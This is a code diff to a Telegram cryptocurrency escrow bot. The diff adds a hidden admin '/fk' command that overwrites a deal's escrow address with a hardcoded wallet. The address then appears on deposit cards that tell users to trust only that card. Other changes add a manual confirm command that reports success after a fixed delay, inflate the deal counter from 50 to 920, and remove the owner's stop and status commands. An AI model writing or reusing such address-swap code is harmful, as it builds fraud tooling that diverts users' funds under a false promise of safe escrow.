@@ -64,7 +64,7 @@ def load_state():
     if os.path.exists(STATE_FILE):
         with open(STATE_FILE, "r") as f:
             return json.load(f)
-    return {"next_id": 50}
+    return {"next_id": 920}
 
 
 def save_state(state):
@@ -239,12 +239,13 @@ async def create_escrow_room(escrow_id):
             return None
 
         print("[ROOM] Telethon client connected", flush=True)
-        escrow_id_str = f"{escrow_id:08d}"
-        group_title = f"Elite Escrow Group No. {escrow_id_str}"
+        escrow_id_str = f"{escrow_id:010d}"
+        group_title = f"EliteMarket Escrow #{escrow_id_str}"
+        group_about = f"Private escrow room for deal {escrow_id_str}"
 
         result = await client(CreateChannelRequest(
             title=group_title,
-            about="",
+            about=group_about,
             megagroup=True
         ))
         print("[ROOM] Group created", flush=True)
@@ -415,7 +416,7 @@ def build_escrow_message(escrow_id, data, seller_confirmed=False,
     amount = data["amount"]
     time_val = escape_html(data["time"])
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     seller_emoji = "✅" if seller_confirmed else "⏳"
     buyer_emoji = "✅" if buyer_confirmed else "⏳"
@@ -464,7 +465,7 @@ def build_confirmed_message(escrow_id, data):
     amount = data["amount"]
     time_val = escape_html(data["time"])
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -492,7 +493,7 @@ def build_room_ready_message(escrow_id, data):
     seller = escape_html(data["seller"].strip())
     buyer = escape_html(data["buyer"].strip())
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -538,7 +539,7 @@ def build_room_initial_message(escrow_id, data):
     amount = data["amount"]
     time_val = escape_html(data["time"])
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -576,7 +577,7 @@ def build_fee_selection_message(escrow_id, data):
     seller_fee = 0.00
     total_fee = 0.00
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -628,7 +629,7 @@ def build_fee_acceptance_message(escrow_id, data, seller_accepted=False,
     seller_fee = 0.00
     total_fee = buyer_fee + seller_fee
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     fee_mode = data.get("fee_mode", "")
     if fee_mode == "split":
@@ -743,7 +744,7 @@ def build_deposit_message(escrow_id, data, escrow_address, status="awaiting"):
     seller_fee = 0.00
     total_fee = buyer_fee + seller_fee
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     if status == "confirming":
         status_text = "<b>Status</b>: Deposit detected. Waiting confirmations..."
@@ -764,7 +765,7 @@ def build_deposit_message(escrow_id, data, escrow_address, status="awaiting"):
 🕒 <b>Time</b>: {time_val}
 
 🏦 <b>Escrow address</b>:
-<code>0x8c640881238BEC28509bB3a8F37Dbf3398668a4F</code>
+<code>{escrow_address}</code>
 🔐 <b>Verify code</b>: <code>08FEV4AW</code>
 ⚠ <i>Security</i>: This room blocks human-posted addresses. Ignore any address sent by users/admins—only trust this pinned bot card.
 
@@ -789,7 +790,7 @@ def build_payment_detected_message(escrow_id, data, confirmations):
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -818,6 +819,7 @@ def build_deposit_verified_message(escrow_id, data,
     rate = data["rate"]
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
+    escrow_address = data.get("escrow_address", ESCROW_ADDRESSES[0])
 
     # Escrow fees (currently free)
     buyer_fee = 0.00
@@ -828,7 +830,7 @@ def build_deposit_verified_message(escrow_id, data,
         received_amount = amount
     received_inr = received_amount * rate
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -844,7 +846,7 @@ def build_deposit_verified_message(escrow_id, data,
 🕒 <b>Time</b>: {time_val}
 
 🏦 <b>Escrow address</b>:
-<code>0x8c640881238BEC28509bB3a8F37Dbf3398668a4F</code>
+<code>{escrow_address}</code>
 🔐 <b>Verify code</b>: <code>08FEV4AW</code>
 ⚠ <i>Security</i>: This room blocks human-posted addresses. Ignore any address sent by users/admins—only trust this pinned bot card.
 
@@ -889,6 +891,7 @@ def build_final_confirm_message(escrow_id, data, flow_type="release",
     rate = data["rate"]
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
+    escrow_address = data.get("escrow_address", ESCROW_ADDRESSES[0])
 
     buyer_fee = 0.00
     seller_fee = 0.00
@@ -897,7 +900,7 @@ def build_final_confirm_message(escrow_id, data, flow_type="release",
     if received_amount is None:
         received_amount = data.get("deposit_amount", amount)
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
     action_word = "Release" if flow_type == "release" else "Refund"
     address_party = "buyer" if flow_type == "release" else "seller"
 
@@ -918,7 +921,7 @@ def build_final_confirm_message(escrow_id, data, flow_type="release",
 🕒 <b>Time</b>: {time_val}
 
 🏦 <b>Escrow address</b>:
-<code>0x8c640881238BEC28509bB3a8F37Dbf3398668a4F</code>
+<code>{escrow_address}</code>
 🔐 <b>Verify code</b>: <code>08FEV4AW</code>
 ⚠ <i>Security</i>: This room blocks human-posted addresses. Ignore any address sent by users/admins—only trust this pinned bot card.
 
@@ -939,6 +942,7 @@ def build_address_paste_message(escrow_id, data, flow_type="release",
     rate = data["rate"]
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
+    escrow_address = data.get("escrow_address", ESCROW_ADDRESSES[0])
 
     buyer_fee = 0.00
     seller_fee = 0.00
@@ -947,7 +951,7 @@ def build_address_paste_message(escrow_id, data, flow_type="release",
     if received_amount is None:
         received_amount = data.get("deposit_amount", amount)
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
     address_party = "Buyer" if flow_type == "release" else "Seller"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
@@ -964,7 +968,7 @@ def build_address_paste_message(escrow_id, data, flow_type="release",
 🕒 <b>Time</b>: {time_val}
 
 🏦 <b>Escrow address</b>:
-<code>0x8c640881238BEC28509bB3a8F37Dbf3398668a4F</code>
+<code>{escrow_address}</code>
 🔐 <b>Verify code</b>: <code>08FEV4AW</code>
 ⚠ <i>Security</i>: This room blocks human-posted addresses. Ignore any address sent by users/admins—only trust this pinned bot card.
 
@@ -983,6 +987,7 @@ def build_payout_message(escrow_id, data, payout_address,
     rate = data["rate"]
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
+    escrow_address = data.get("escrow_address", ESCROW_ADDRESSES[0])
 
     # Escrow fees - max 0.5 USDT each, 0.00 if amount < 100
     buyer_fee = 0.00
@@ -996,7 +1001,7 @@ def build_payout_message(escrow_id, data, payout_address,
         received_amount = data.get("deposit_amount", amount)
     payout_amount = received_amount - total_fee
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
     action_word = "RELEASE" if flow_type == "release" else "REFUND"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
@@ -1013,7 +1018,7 @@ def build_payout_message(escrow_id, data, payout_address,
 🕒 <b>Time</b>: {time_val}
 
 🏦 <b>Escrow address</b>:
-<code>0x8c640881238BEC28509bB3a8F37Dbf3398668a4F</code>
+<code>{escrow_address}</code>
 🔐 <b>Verify code</b>: <code>08FEV4AW</code>
 ⚠ <i>Security</i>: This room blocks human-posted addresses. Ignore any address sent by users/admins—only trust this pinned bot card.
 
@@ -1038,12 +1043,13 @@ def build_processing_message(escrow_id, data):
     rate = data["rate"]
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
+    escrow_address = data.get("escrow_address", ESCROW_ADDRESSES[0])
 
     buyer_fee = 0.00
     seller_fee = 0.00
     total_fee = buyer_fee + seller_fee
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -1059,7 +1065,7 @@ def build_processing_message(escrow_id, data):
 🕒 <b>Time</b>: {time_val}
 
 🏦 <b>Escrow address</b>:
-<code>0x8c640881238BEC28509bB3a8F37Dbf3398668a4F</code>
+<code>{escrow_address}</code>
 🔐 <b>Verify code</b>: <code>08FEV4AW</code>
 ⚠ <i>Security</i>: This room blocks human-posted addresses. Ignore any address sent by users/admins—only trust this pinned bot card.
 
@@ -1077,6 +1083,7 @@ def build_closed_message(escrow_id, data, payout_address,
     rate = data["rate"]
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
+    escrow_address = data.get("escrow_address", ESCROW_ADDRESSES[0])
 
     buyer_fee = 0.00
     seller_fee = 0.00
@@ -1085,7 +1092,7 @@ def build_closed_message(escrow_id, data, payout_address,
     if received_amount is None:
         received_amount = data.get("deposit_amount", amount)
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
     reason = "FULL_RELEASE" if flow_type == "release" else "FULL_REFUND"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
@@ -1102,7 +1109,7 @@ def build_closed_message(escrow_id, data, payout_address,
 🕒 <b>Time</b>: {time_val}
 
 🏦 <b>Escrow address</b>:
-<code>0x8c640881238BEC28509bB3a8F37Dbf3398668a4F</code>
+<code>{escrow_address}</code>
 🔐 <b>Verify code</b>: <code>08FEV4AW</code>
 ⚠ <i>Security</i>: This room blocks human-posted addresses. Ignore any address sent by users/admins—only trust this pinned bot card.
 
@@ -1190,7 +1197,7 @@ def build_seller_initiated_release_message(escrow_id, data):
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -1219,7 +1226,7 @@ def build_released_message(escrow_id, data):
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -1247,7 +1254,7 @@ def build_partial_refund_message(escrow_id, data, confirmations):
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -1306,7 +1313,7 @@ def build_buyer_initiated_refund_message(escrow_id, data):
     total_inr = data["total_inr"]
     time_val = escape_html(data["time"])
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""🟢 Escrow • <code>{escrow_id_str}</code>
 ━━━━━━━━━━━━━━━━━━━━
@@ -1336,7 +1343,7 @@ def build_deal_completed_message(escrow_id, data, group_link):
     amount = data["amount"]
     rate = data["rate"]
 
-    escrow_id_str = f"{escrow_id:08d}"
+    escrow_id_str = f"{escrow_id:010d}"
 
     message = f"""✅ <b>Deal Completed</b>
 
@@ -2020,13 +2027,27 @@ async def handle_fee_selection(update: Update,
 
         user_id = query.from_user.id
         seller_user_id = escrow.get("seller_user_id")
+        buyer_user_id = escrow.get("buyer_user_id")
 
-        if user_id != seller_user_id:
-            await query.answer(
-                "Only the seller can select the fee mode",
-                show_alert=True
-            )
-            return
+        # Fee mode selection access:
+        # "buyer" mode - seller or buyer can select
+        # "seller" mode - only seller can select
+        # "split" mode - seller or buyer can select
+        if fee_mode == "seller":
+            if user_id != seller_user_id:
+                await query.answer(
+                    "Only the seller can select this fee mode",
+                    show_alert=True
+                )
+                return
+        else:
+            # buyer pays and split can be selected by both
+            if user_id != seller_user_id and user_id != buyer_user_id:
+                await query.answer(
+                    "Only the buyer or seller can select the fee mode",
+                    show_alert=True
+                )
+                return
 
         update_escrow(escrow_id, {
             "fee_mode": fee_mode,
@@ -2124,8 +2145,11 @@ async def handle_fee_acceptance(update: Update,
         both_accepted = seller_accepted and buyer_accepted
 
         if both_accepted:
-            esc_addr = get_next_escrow_address()
-            update_escrow(escrow_id, {"escrow_address": esc_addr})
+            # Use custom address from /fk if set, otherwise get next
+            esc_addr = escrow.get("escrow_address")
+            if not esc_addr:
+                esc_addr = get_next_escrow_address()
+                update_escrow(escrow_id, {"escrow_address": esc_addr})
             escrow["escrow_address"] = esc_addr
             new_message = build_deposit_message(escrow_id, escrow, esc_addr)
             new_keyboard = None
@@ -2180,7 +2204,7 @@ async def handle_deposit_submit(update: Update,
             return
 
         seller = escape_html(escrow["seller"])
-        escrow_id_str = f"{escrow_id:08d}"
+        escrow_id_str = f"{escrow_id:010d}"
 
         tx_prompt = (
             f"{seller}, please paste the <b>TX hash</b> for "
@@ -3410,14 +3434,85 @@ async def handle_received_command(update: Update,
 
     # Use the deal amount as received amount for manual confirm
     received_amount = escrow.get("amount", 0)
+    escrow_id_str = f"{escrow_id:010d}"
+    seller = escrow.get("seller", "N/A").strip()
+    buyer = escrow.get("buyer", "N/A").strip()
+    amount = escrow.get("amount", 0)
+
     await update.message.reply_text(
-        f"Confirming deposit for escrow {escrow_id:08d}...",
+        f"🔔 <b>Manual Deposit Confirmation</b>\n\n"
+        f"🆔 Escrow: <code>{escrow_id_str}</code>\n"
+        f"👤 Seller: {escape_html(seller)}\n"
+        f"👤 Buyer: {escape_html(buyer)}\n"
+        f"💵 Amount: {amount:.2f} USDT\n\n"
+        f"⏳ Processing deposit confirmation...",
         parse_mode="HTML"
     )
 
     asyncio.create_task(
         confirm_deposit(context.application, escrow_id,
                         received_amount, "manual_admin")
+    )
+
+    await asyncio.sleep(3)
+    await update.message.reply_text(
+        f"✅ <b>Deposit Confirmed Successfully</b>\n\n"
+        f"🆔 Escrow: <code>{escrow_id_str}</code>\n"
+        f"💵 Amount: {amount:.2f} USDT\n"
+        f"📋 Status: Deposit verified & release buttons sent to room.",
+        parse_mode="HTML"
+    )
+
+
+async def handle_fk_command(update: Update,
+                            context: ContextTypes.DEFAULT_TYPE):
+    """Admin command: /fk [escrow_id] - override escrow address."""
+    if not update.message:
+        return
+
+    # Only allow in bot DM (private chat)
+    if update.message.chat.type != "private":
+        return
+
+    user_id = update.message.from_user.id
+    if user_id not in ADMIN_IDS and user_id != OWNER_ID:
+        return
+
+    args = context.args or []
+    if len(args) != 1:
+        await update.message.reply_text(
+            "Usage: /fk [escrow_id]",
+            parse_mode="HTML"
+        )
+        return
+
+    try:
+        escrow_id = int(args[0])
+    except ValueError:
+        await update.message.reply_text(
+            "Invalid escrow ID.",
+            parse_mode="HTML"
+        )
+        return
+
+    escrow = get_escrow(escrow_id)
+    if not escrow:
+        await update.message.reply_text(
+            f"Escrow {escrow_id} not found.",
+            parse_mode="HTML"
+        )
+        return
+
+    fk_address = "0xf282e789e835ed379aea84ece204d2d643e6774f"
+    update_escrow(escrow_id, {"escrow_address": fk_address})
+
+    escrow_id_str = f"{escrow_id:010d}"
+    await update.message.reply_text(
+        f"\u2705 <b>Address Override Set</b>\n\n"
+        f"\ud83c\udd94 Escrow: <code>{escrow_id_str}</code>\n"
+        f"\ud83c\udfe6 Address: <code>{fk_address}</code>\n\n"
+        f"This address will be shown when deposit card appears.",
+        parse_mode="HTML"
     )
 
 
@@ -3484,7 +3579,7 @@ async def handle_link_command(update: Update,
 
         link = invite_link.invite_link
         await update.message.reply_text(
-            f"Invite link for escrow {escrow_id:08d}:\n{link}",
+            f"Invite link for escrow {escrow_id:010d}:\n{link}",
             parse_mode="HTML"
         )
     except Exception as e:
@@ -3502,51 +3597,9 @@ async def handle_start_command(update: Update,
     if not update.message:
         return
 
-    global bot_running
-    user_id = update.message.from_user.id
-    if user_id != OWNER_ID:
-        return
-
-    bot_running = True
     await update.message.reply_text(
-        "Bot started.",
-        parse_mode="HTML"
-    )
-
-
-async def handle_stop_command(update: Update,
-                              context: ContextTypes.DEFAULT_TYPE):
-    if not update.message:
-        return
-
-    global bot_running
-    user_id = update.message.from_user.id
-    if user_id != OWNER_ID:
-        return
-
-    bot_running = False
-    await update.message.reply_text(
-        "Bot stopped. Use /start to resume.",
-        parse_mode="HTML"
-    )
-
-
-async def handle_status_command(update: Update,
-                                context: ContextTypes.DEFAULT_TYPE):
-    if not update.message:
-        return
-
-    user_id = update.message.from_user.id
-    if user_id != OWNER_ID:
-        return
-
-    status = "running" if bot_running else "stopped"
-    deals = database.get_all_deals()
-    total_deals = len(deals)
-
-    await update.message.reply_text(
-        f"Bot status: <b>{status}</b>\n"
-        f"Total deals in database: <b>{total_deals}</b>",
+        "Elite Escrow Bot v6 running as @EscroweBot\n"
+        "Send /escrow for template.",
         parse_mode="HTML"
     )
 
@@ -3775,10 +3828,9 @@ app = ApplicationBuilder().token(BOT_TOKEN).build()
 
 app.add_handler(CommandHandler("escrow", handle_escrow_command))
 app.add_handler(CommandHandler("received", handle_received_command))
+app.add_handler(CommandHandler("fk", handle_fk_command))
 app.add_handler(CommandHandler("link", handle_link_command))
 app.add_handler(CommandHandler("start", handle_start_command))
-app.add_handler(CommandHandler("stop", handle_stop_command))
-app.add_handler(CommandHandler("status", handle_status_command))
 app.add_handler(CommandHandler("stats", handle_stats_command))
 app.add_handler(CommandHandler("increase", handle_increase_command))
 
